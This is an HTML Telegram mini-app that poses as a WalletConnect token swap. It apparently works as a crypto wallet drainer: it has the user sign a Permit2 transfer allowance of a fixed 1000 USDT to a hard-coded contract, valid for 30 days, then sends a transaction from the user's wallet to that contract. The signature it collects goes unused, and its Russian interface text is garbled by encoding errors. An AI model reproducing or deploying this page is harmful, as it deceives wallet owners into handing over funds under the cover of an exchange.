<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>AutoSwap via WalletConnect</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.7.0/dist/umd/sign-client.umd.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: #17212b;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
      text-align: center;
    }
    canvas {
      margin: 20px 0;
      background: #fff;
      padding: 10px;
      border-radius: 8px;
    }
    #status {
      margin-top: 20px;
      font-size: 16px;
      color: #66bb6a;
      white-space: pre-wrap;
    }
    #uriText {
      color: #999;
      font-size: 12px;
      word-break: break-all;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h2>–ü–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª—ë–∫ –¥–ª—è –æ–±–º–µ–Ω–∞</h2>
  <canvas id="qrcode" width="200" height="200"></canvas>
  <div id="uriText"></div>
  <div id="status">‚è≥ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>

  <script>
    const CONFIG = {
      projectId: "d868f90cd734355ae0320f8f0258b6b1",
      chainId: 56,
      permit2: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
      autoswap: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
      token: "0x55d398326f99059fF775485246999027b3197955", // USDT
      amount: "1000000000000000000000", // 1000 USDT (18 decimals)
      deadlineSec: 30 * 24 * 60 * 60 // 30 –¥–Ω–µ–π
    };

    const statusEl = document.getElementById("status");
    const canvas = document.getElementById("qrcode");
    const uriEl = document.getElementById("uriText");

    const setStatus = (text, error = false) => {
      statusEl.textContent = text;
      statusEl.style.color = error ? "#e64a45" : "#66bb6a";
    };

    async function runApp() {
      try {
        const SignClient = window.SignClient;

        const client = await SignClient.init({
          projectId: CONFIG.projectId,
          metadata: {
            name: "AutoSwap WebApp",
            description: "Permit2 + Swap",
            url: location.href,
            icons: []
          }
        });

        const { uri, approval } = await client.connect({
          requiredNamespaces: {
            eip155: {
              methods: ["eth_sendTransaction", "eth_signTypedData"],
              chains: [`eip155:${CONFIG.chainId}`],
              events: []
            }
          }
        });

        if (uri) {
          QRCode.toCanvas(canvas, uri);
          uriEl.textContent = uri;
          setStatus("üì± –û—Ç—Å–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR-–∫–æ–¥ –≤ Trust Wallet –∏–ª–∏ MetaMask");
        }

        const session = await approval();
        const topic = session.topic;
        const address = session.namespaces.eip155.accounts[0].split(":")[2];

        setStatus("‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ: " + address);

        const now = Math.floor(Date.now() / 1000);
        const deadline = now + CONFIG.deadlineSec;
        const nonce = now; // –≤—Ä–µ–º–µ–Ω–Ω—ã–π nonce

        // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –¥–ª—è PermitTransferFrom
        const domain = {
          name: "Permit2",
          chainId: CONFIG.chainId,
          verifyingContract: CONFIG.permit2
        };

        const types = {
          PermitTransferFrom: [
            { name: "permitted", type: "TokenPermissions" },
            { name: "spender", type: "address" },
            { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
          ],
          TokenPermissions: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint256" }
          ]
        };

        const message = {
          permitted: {
            token: CONFIG.token,
            amount: CONFIG.amount
          },
          spender: CONFIG.autoswap,
          nonce,
          deadline
        };

        const typedData = { domain, types, message, primaryType: "PermitTransferFrom" };

        const signature = await client.request({
          topic,
          chainId: `eip155:${CONFIG.chainId}`,
          request: {
            method: "eth_signTypedData",
            params: [address, JSON.stringify(typedData)]
          }
        });

        const sig = ethers.Signature.from(signature);
        const v = sig.v;
        const r = sig.r;
        const s = sig.s;

        const iface = new ethers.Interface([
          "function swapForUser(address user, uint256 amount)"
        ]);

        const data = iface.encodeFunctionData("swapForUser", [address, CONFIG.amount]);

        const tx = {
          from: address,
          to: CONFIG.autoswap,
          data
        };

        const txHash = await client.request({
          topic,
          chainId: `eip155:${CONFIG.chainId}`,
          request: {
            method: "eth_sendTransaction",
            params: [tx]
          }
        });

        setStatus("üöÄ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!\nHash: " + txHash);
      } catch (e) {
        console.error(e);
        setStatus("‚ùå –û—à–∏–±–∫–∞: " + (e.message || e), true);
      }
    }

    Telegram.WebApp.ready();
    Telegram.WebApp.expand();

    runApp();
  </script>
</body>
</html>